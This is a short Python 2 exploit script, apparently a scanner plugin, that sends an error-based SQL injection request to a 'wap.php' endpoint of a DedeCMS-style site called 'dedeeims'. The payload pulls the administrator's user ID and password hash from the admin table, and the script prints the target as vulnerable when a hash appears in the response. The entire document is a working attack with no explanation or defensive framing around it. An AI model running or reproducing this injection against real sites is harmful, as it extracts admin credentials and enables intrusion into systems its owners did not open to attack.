def exploit(url):
	poc = "http://"+url+"/wap.php?action=list&id=1"+chr(37)+"20or"+chr(37)+"20@`'`=1"+chr(37)+"20and"+chr(37)+"20(SELECT"+chr(37)+"201"+chr(37)+"20FROM"+chr(37)+"20(select"+chr(37)+"20count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x3d,pwd)+from+`"+chr(37)+"23@__admin`+limit+0,1),1,62)))a"+chr(37)+"20from"+chr(37)+"20information_schema.tables"+chr(37)+"20group"+chr(37)+"20by"+chr(37)+"20a)b)"+chr(37)+"20and"+chr(37)+"20@`'`=0"
	try:
		ok=fuck.urlget(poc)
		if ok.getcode() == 200:
			str=ok.read()
			tmp=fuck.find("\w+=\w{20}",str)
			if len(tmp)>0:
				fuck.report('dedeeims_SQLInject',"%s"%tmp[0])
				print "TARGET dedeeims_SQLInject VULNERABLE !"
	except Exception,e:
		print e
exploit(test_url)